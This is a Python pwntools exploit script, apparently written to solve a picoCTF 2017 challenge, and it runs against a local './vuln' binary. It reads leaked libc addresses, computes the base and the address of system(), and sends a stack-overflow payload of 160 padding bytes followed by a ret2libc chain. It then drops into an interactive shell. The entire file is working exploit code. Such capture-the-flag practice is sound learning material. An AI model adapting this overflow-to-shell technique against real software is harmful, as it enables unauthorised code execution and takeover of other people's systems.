from pwn import *

addresses = {}
SYSTEM_OFFSET = 0x3a940
PUTS_OFFSET = 0x5f140

def get_useful_addresses():
	r.recvline()
	r.recvline()
	add = r.recvuntil("Enter")
	for address in add.split("\n"): 
		if address != "" and address != "Enter" and ":" in address:
			addresses[address.split(": ")[0]] = address.split(": ")[1] 

def handle_logic():
	get_useful_addresses()
	r.recvuntil("ring:")
	libc_base_address = hex((int(addresses['puts'], 16) - PUTS_OFFSET))
	system_libc_address = hex(int(libc_base_address, 16) + SYSTEM_OFFSET)
	print ("libc base address - " + libc_base_address)
	print ("system libc address - " + system_libc_address)
	payload = "A"*160
	payload += p32(int(system_libc_address, 16))
	payload += p32(int("0xdeadbeef", 16)) 
	payload += p32(int(addresses['useful_string'],16))
	
	pause()
	r.sendline(payload)
	

if __name__ == "__main__":
	#r = remote("shell2017.picoctf.com", 36069)
	r = process(['./vuln'])
	handle_logic()
	r.interactive()